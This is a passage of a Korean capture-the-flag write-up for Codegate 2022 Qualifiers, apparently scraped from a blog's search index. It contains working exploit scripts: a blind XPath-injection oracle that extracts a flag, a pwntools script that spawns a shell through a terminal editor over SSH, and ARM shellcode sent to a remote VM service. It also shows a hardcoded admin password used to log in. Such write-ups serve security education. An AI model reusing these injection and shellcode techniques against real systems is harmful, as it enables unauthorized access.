s.post(f\u0026#34;{url}/blog/write\u0026#34;, data={\u0026#34;title\u0026#34;: \u0026#34;OKOKOK\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;OKOKOK\u0026#34;}) print(r.text) def oracle(cond): idx = f\u0026#34;0\u0026#39; or {cond} and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34; r = s.get(f\u0026#34;{url}/blog/read\u0026#34;, params={\u0026#34;idx\u0026#34;: idx}) return \u0026#34;OKOKOK\u0026#34; in r.text flag_len = 0 for i in range(1, 0x100): if oracle(f\u0026#34;string-length(system-property(\u0026#39;flag\u0026#39;))={i}\u0026#34;): flag_len = i break print(flag_len) flag = \u0026#34;\u0026#34; for i in range(flag_len): for c in string.printable: if oracle(f\u0026#34;substring(system-property(\u0026#39;flag\u0026#39;), {i+1}, 1)=\u0026#39;{c}\u0026#39;\u0026#34;): flag += c break print(flag) print(flag) VIMT 문자를 입력하면 뒤에 랜덤한 문자열이 추가로 생긴다. 바이너리를 분석해보면 set y {n}을 통해 n번째 줄로 이동할 수 있는 기능이 있다. ssh를 통해 접속하는 문제이므로 stty 명령을 통해 columns를 1로 설정하여 한 줄에 한 문자만 쓰이도록 할 수 있다. 이를 이용해 문자를 입력하고, set y {n}으로 입력한 문자의 다음으로 이동하여 원하는 내용을 쓸 수 있다.\nfrom pwn import * code = \u0026#34;\u0026#34;\u0026#34;main() { system(\u0026#34;/bin/sh\u0026#34;); } //\u0026#34;\u0026#34;\u0026#34; rows = len(code)+10 s = ssh(user=\u0026#34;ctf\u0026#34;, host=\u0026#34;3.38.59.103\u0026#34;, port=1234, password=\u0026#34;ctf1234_smiley\u0026#34;) p = s.process(\u0026#34;/bin/sh\u0026#34;) p.sendlineafter(\u0026#34;$ \u0026#34;, f\u0026#34;stty rows {rows} cols 1\u0026#34;.encode()) p.sendlineafter(\u0026#34;$ \u0026#34;, b\u0026#34;./app\u0026#34;) def rr(): for i in range(rows-1): p.readline() rr() for i in range(len(code)): p.send(code[i]) rr() p.send(\u0026#34;\\x1b\u0026#34;) p.sendlineafter(\u0026#34;:\u0026#34;, f\u0026#34;set y {i}\u0026#34;) p.send(\u0026#34;\\x1b\u0026#34;) p.sendlineafter(\u0026#34;:\u0026#34;, \u0026#34;compile\u0026#34;) p.interactive() ARVM if ( run_vm() == -1 ) exit(-1); puts(\u0026#34;Good! Now Execute Real Machine\u0026#34;); dest = calloc(1u, 0x1000u); memcpy(dest, *(const void **)(dword_2407C + 8), 0x1000u); memset(*(void **)(dword_2407C + 8), 0, 0x1000u); memcpy(*(void **)(dword_2407C + 8), \u0026amp;unk_1346C, 0x34u); v3 = memcpy((void *)(*(_DWORD *)(dword_2407C + 8) + 52), dest, 0xFCCu); (*(void (__fastcall **)(void *))(dword_2407C + 8))(v3); vm을 작동하는 함수가 -1을 반환하지 않으면, 입력한 code를 실행해준다. code의 처음에 0x0이 있다면 그대로 run_vm()이 정상적으로 종료되는 것을 확인할 수 있었다. 그 뒤에 shellcode를 추가하여 shell을 획득할 수 있었다.\nfrom pwn import * context.arch = \u0026#34;arm\u0026#34; p = remote(\u0026#34;15.165.92.159\u0026#34;, 1234) p.recvline() p.recvline() code = b\u0026#34;\u0026#34; code += p32(0) code += b\u0026#34;\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x49\\x40\\x52\\x40\\xc2\\x71\\x0b\\x27\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x78\u0026#34; p.sendafter(b\u0026#34;:\u0026gt; \u0026#34;, code) def view_code(): p.sendafter(b\u0026#34;:\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) return p.recvuntil(b\u0026#34;1. Run\u0026#34;)[:-6] def run_code(): p.sendafter(b\u0026#34;:\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;Secret code : \u0026#34;) code = p.recvline().strip() p.sendlineafter(b\u0026#34;:\u0026gt; \u0026#34;, code) run_code() p.interactive() ","permalink":"https://blog.imssm99.kr/ctf/codegate2022_qual/","summary":"University Division, imssm99, 3rd (4249 points)\nCAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.\ndriver.get(\u0026#39;http://3.39.55.38:1929/login\u0026#39;) driver.find_element_by_id(\u0026#39;id\u0026#39;).send_keys(\u0026#39;admin\u0026#39;) driver.find_element_by_id(\u0026#39;pw\u0026#39;).send_keys(\u0026#39;$MiLEYEN4\u0026#39;) driver.find_element_by_id(\u0026#39;submit\u0026#39;).click() time.sleep(2) superbee func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(\u0026#34;auth_crypt_key\u0026#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.\n... } else if controllerName == \u0026#34;AdminController\u0026#34; { domain := this.Ctx.Input.Domain() if domain != \u0026#34;localhost\u0026#34; { this.Abort(\u0026#34;Not Local\u0026#34;) return } } ... func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.","title":"Codegate2022 Qual Writeup"}]